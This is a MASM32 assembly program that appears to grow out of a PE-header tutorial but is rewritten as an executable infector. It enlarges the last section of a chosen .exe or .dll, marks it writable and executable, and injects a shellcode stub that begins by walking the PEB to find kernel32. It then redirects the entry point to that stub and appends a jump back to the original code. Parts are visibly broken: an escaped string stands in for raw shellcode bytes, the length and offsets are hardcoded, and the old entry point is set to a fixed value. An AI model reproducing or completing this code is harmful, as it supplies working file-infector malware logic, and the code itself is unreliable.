.386
.model flat, stdcall
option casemap : none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\comdlg32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\comdlg32.lib

SEH struct
PrevLink dd ? ; the address of the previous seh structure
CurrentHandler dd ? ; the address of the new exception handler
SafeOffset dd ? ; The offset where it's safe to continue execution
PrevEsp dd ? ; the old value in esp
PrevEbp dd ? ; The old value in ebp
SEH ends


.data
AppName db "PE tutorial no.2", 0
ofn   OPENFILENAME <>
FilterString db "Executable Files (*.exe, *.dll)", 0, "*.exe;*.dll", 0
db "All Files", 0, "*.*", 0, 0
FileOpenError db "Cannot open the file for reading", 0
FileOpenMappingError db "Cannot open the file for memory mapping", 0
FileMappingError db "Cannot map the file into memory", 0
FileValidPE db "This file is a valid PE", 0
FileInValidPE db "This file is not a valid PE", 0
shellcode db "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b", 0
.data?
numsec dd ?
buffer db 512 dup(? )
hFile dd ?
hMapping dd ?
hWrite dd ?
pMapping dd ?
pLastsection dd ?
ValidPE dd ?
ntheader dd ?
lastSec dd ?
Characteristic dd ?
RawSize dd ?
VirtualSize dd ?
SizeOfImage dd ?
newVirtualSize dd ?
newRawSize dd ?
newCharacteristics dd ?
newSizeOfImage dd ?
sw dd ?
newEOP dd ?
RVAnewEOP dd ?
num dd ?
oldEOP dd ?
len dd ?
RVAendShellcode dd ?
endShellcode dd ?
jum_oldEOP dd ?

.code
start proc
LOCAL seh : SEH
mov ofn.lStructSize, SIZEOF ofn
mov  ofn.lpstrFilter, OFFSET FilterString
mov  ofn.lpstrFile, OFFSET buffer
mov  ofn.nMaxFile, 512
mov  ofn.Flags, OFN_FILEMUSTEXIST or \
OFN_PATHMUSTEXIST or OFN_LONGNAMES or \
OFN_EXPLORER or OFN_HIDEREADONLY
invoke GetOpenFileName, ADDR ofn
.if eax == TRUE
invoke CreateFile, addr buffer, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
.if eax != INVALID_HANDLE_VALUE
mov hFile, eax
invoke CreateFileMapping, hFile, NULL, PAGE_READONLY, 0, 0, 0
.if eax != NULL
mov hMapping, eax
invoke MapViewOfFile, hMapping, FILE_MAP_READ, 0, 0, 0
.if eax != NULL
mov pMapping, eax
assume fs : nothing
push fs : [0]
pop seh.PrevLink
mov seh.CurrentHandler, offset SEHHandler
mov seh.SafeOffset, offset FinalExit
lea eax, seh
mov fs : [0], eax
mov seh.PrevEsp, esp
mov seh.PrevEbp, ebp
mov edi, pMapping
assume edi : ptr IMAGE_DOS_HEADER
.if[edi].e_magic == IMAGE_DOS_SIGNATURE
add edi, [edi].e_lfanew
assume edi : ptr IMAGE_NT_HEADERS
mov ntheader, edi
.if[edi].Signature == IMAGE_NT_SIGNATURE
mov ValidPE, TRUE
.else
mov ValidPE, FALSE
.endif
.else
mov ValidPE, FALSE
.endif
FinalExit :
.if ValidPE == TRUE

mov cx, [edi].FileHeader.NumberOfSections
movzx ecx, cx
dec ecx
mov numsec, ecx
mov eax, numsec
mov ebx, sizeof IMAGE_SECTION_HEADER
mul ebx
mov ebx, ntheader
add ebx, sizeof IMAGE_NT_HEADERS
add ebx, eax
mov esi, ebx
assume esi : ptr IMAGE_SECTION_HEADER
mov pLastsection, esi

mov Characteristic, esi
mov edi, pMapping
sub Characteristic, edi
add Characteristic, 36
mov eax, Characteristic

mov RawSize, esi
mov edi, pMapping
sub RawSize, edi
add RawSize, 16

mov VirtualSize, esi
mov edi, pMapping
sub VirtualSize, edi
add VirtualSize, 8

mov edi, ntheader
mov SizeOfImage, edi
mov esi, pMapping
sub SizeOfImage, esi
add SizeOfImage, 80


mov esi, pLastsection
mov edi, [esi].SizeOfRawData
mov newVirtualSize, edi
add newVirtualSize, 256

mov eax, newVirtualSize
mov newRawSize, eax
mov newCharacteristics, 3758096480

mov esi, pLastsection
mov edi, [esi].Misc.VirtualSize
add edi, [esi].VirtualAddress
mov newSizeOfImage, edi

mov esi, pLastsection
mov eax, [esi].PointerToRawData
add eax, [esi].SizeOfRawData
mov sw, eax
mov newEOP, eax

mov esi, pLastsection
mov ebx, [esi].PointerToRawData
mov eax, newEOP
sub eax, ebx
mov ebx, [esi].VirtualAddress
add eax, ebx
mov RVAnewEOP, eax
invoke CloseHandle, hFile
invoke CreateFile, addr buffer, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL
mov hWrite, eax
invoke SetFilePointer, hWrite, SizeOfImage, 0, FILE_BEGIN
invoke WriteFile, hWrite, offset newSizeOfImage, 4, offset num, NULL
invoke SetFilePointer, hWrite, VirtualSize, 0, FILE_BEGIN
invoke WriteFile, hWrite, offset newVirtualSize, 4, offset num, NULL
invoke SetFilePointer, hWrite, RawSize, 0, FILE_BEGIN
invoke WriteFile, hWrite, offset newRawSize, 4, offset num, NULL
invoke SetFilePointer, hWrite, Characteristic, 0, FILE_BEGIN
invoke WriteFile, hWrite, offset newCharacteristics, 4, offset num, NULL
invoke SetFilePointer, hWrite, sw, 0, FILE_BEGIN


; mov edi, ntheader
; mov eax, [edi].OptionalHeader.AddressOfEntryPoint
; mov ebx, pMapping
; sub eax, ebx
; mov oldEOP, ebx

mov oldEOP, 128


invoke wsprintf, addr buffer, addr shellcode


mov len, 202

mov ebx, RVAnewEOP
add ebx, len
mov RVAendShellcode, ebx

mov ebx, newEOP
add ebx, len
mov endShellcode, ebx

mov edi, ntheader
mov eax, RVAendShellcode
mov ebx, [edi].OptionalHeader.AddressOfEntryPoint
sub ebx, eax
sub ebx, 4
mov jum_oldEOP, ebx

invoke SetFilePointer, hWrite, newEOP, 0, FILE_BEGIN
invoke WriteFile, hWrite, offset buffer, len, offset num, NULL
invoke SetFilePointer, hWrite, endShellcode, 0, FILE_BEGIN
invoke WriteFile, hWrite, offset jum_oldEOP, 4, offset num, NULL
invoke SetFilePointer, hWrite, oldEOP, 0, FILE_BEGIN
invoke WriteFile, hWrite, offset RVAnewEOP, 4, offset num, NULL

.else
invoke MessageBox, 0, addr FileInValidPE, addr AppName, MB_OK + MB_ICONINFORMATION
.endif
push seh.PrevLink
pop fs : [0]
invoke UnmapViewOfFile, pMapping
.else
invoke MessageBox, 0, addr FileMappingError, addr AppName, MB_OK + MB_ICONERROR
.endif
invoke CloseHandle, hMapping
.else
invoke MessageBox, 0, addr FileOpenMappingError, addr AppName, MB_OK + MB_ICONERROR
.endif
invoke CloseHandle, hFile
.else
invoke MessageBox, 0, addr FileOpenError, addr AppName, MB_OK + MB_ICONERROR
.endif
.endif
invoke ExitProcess, 0
start endp
SEHHandler proc C uses edx pExcept : DWORD, pFrame : DWORD, pContext : DWORD, pDispatch : DWORD
mov edx, pFrame
assume edx : ptr SEH
mov eax, pContext
assume eax : ptr CONTEXT
push[edx].SafeOffset
pop[eax].regEip
push[edx].PrevEsp
pop[eax].regEsp
push[edx].PrevEbp
pop[eax].regEbp
mov ValidPE, FALSE
mov eax, ExceptionContinueExecution
ret
SEHHandler endp

end start
